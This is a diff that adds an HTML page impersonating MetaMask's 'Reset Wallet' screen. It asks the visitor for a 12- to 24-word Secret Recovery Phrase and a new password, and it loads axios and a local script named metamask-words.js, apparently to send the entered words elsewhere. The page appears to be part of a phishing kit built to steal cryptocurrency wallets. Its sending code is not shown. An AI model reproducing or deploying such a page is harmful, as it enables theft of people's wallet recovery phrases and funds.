@@ -1,0 +1,79 @@
+<!DOCTYPE html >
+<html lang="ru-RU">
+  <head>
+    <meta charset="utf-8"/>
+    <title>Metamask</title>
+    <meta http-equiv="X-UA-Compatible" content="IE = edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta name="keywords" content="./Decentralized protocol for launching new ideas _ Polkastarter_files/favicon.svg"/>
+    <link rel="stylesheet" type="text/css" href="static/css/styles.css"/>
+    <link rel="icon" type="image/x-icon" href="./"/>
+  </head>
+  <body> 
+    <div class="metamask-words">
+      <div class="wrapper-2"> <a class="back-btn" href="./metamask.html">< Back</a>
+        <div class="title">Reset Wallet</div>
+        <p>MetaMask does not keep a copy of your password. If you’re having trouble unlocking your account, you will need to reset your wallet. You can do this by providing the Secret Recovery Phrase you used when you set up your wallet.</p>
+        <p>This action will delete your current wallet and Secret Recovery Phrase from this device, along with the list of accounts you’ve curated. After resetting with a Secret Recovery Phrase, you’ll see a list of accounts based on the Secret Recovery Phrase you use to reset. This new list will automatically include accounts that have a balance. You’ll also be able to re-add any other accounts created previously. Custom accounts that you’ve imported will need to be re-added, and any custom tokens you’ve added to an account will need to be re-added as well. </p>
+        <p>Make sure you’re using the correct Secret Recovery Phrase before proceeding. You will not be able to undo this.</p>
+        <form class="recovery-form">
+          <div class="recovery-form__header"> 
+            <h3>Secret Recovery Phrase</h3>
+            <div class="recovery-form__dropdown">
+              <select name="">
+                <option value="12">I have a 12-word phrase</option>
+                <option value="15">I have a 15-word phrase</option>
+                <option value="18">I have a 18-word phrase</option>
+                <option value="21">I have a 21-word phrase</option>
+                <option value="24">I have a 24-word phrase</option>
+              </select>
+              <svg class="dropdown__icon-caret-down" width="16" height="16" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                <path d="m399 177c-8-8-22-8-30 0l-113 113-113-113c-8-8-22-8-30 0-8 8-8 22 0 30l128 128c8 8 22 8 30 0l128-128c8-8 8-22 0-30z"></path>
+              </svg>
+            </div>
+          </div>
+          <div class="recovery-form__message"> 
+            <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
+              <path d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z" fill="var(--color-info-default)"></path>
+            </svg>
+            <p>You can paste your entire secret recovery phrase into any field</p>
+          </div>
+          <div class="recovery-form__text-inputs">
+            <div class="recovery-form__input-group">
+              <label class="recovery-form__input-number" for="input-1">1.</label>
+              <div class="recovery-form__show-toggle">
+                <input class="recovery-form__input" type="text" id="input-1"/>
+                <input class="recovery-form__show-toggle-input" type="checkbox" id="toggle-1"/>
+                <label class="recovery-form__show-toggle-label" for="toggle-1">
+                  <svg class="show-hide-toggle__icon" width="24" height="24" fill="currentColor" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 640 512">
+                    <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
+                  </svg>
+                </label>
+              </div>
+            </div>
+          </div>
+          <div class="recovery-form__message recovery-form__message--err">
+            <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
+              <path d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z" fill="var(--color-info-default)"></path>
+              <p>Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words</p>
+            </svg>
+          </div>
+          <div class="recovery-form__pass-inputs">
+            <div class="recovery-form__input-pass-group">
+              <label class="recovery-form__input-pass-label" for="pass">New password (8 characters min)</label>
+              <input class="recovery-form__input-pass" type="password" id="pass"/>
+            </div>
+            <div class="recovery-form__input-pass-group">
+              <label class="recovery-form__input-pass-label" for="confpass">Confirm password</label>
+              <input class="recovery-form__input-pass" type="password" id="confpass"/>
+            </div>
+          </div>
+          <button class="recovery-form__submit-btn" type="submit">Restore</button>
+        </form>
+      </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="static/js/metamask-words.js"></script>
+    <script src="static/js/vendors/libs.js"></script>
+  </body>
+</html>
